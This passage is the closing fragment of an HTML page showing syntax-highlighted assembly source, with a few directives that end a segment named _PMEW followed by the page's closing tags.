</span><span class="sc5">PMEW_END</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_PMEW</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">



</span></div></body>
</html>
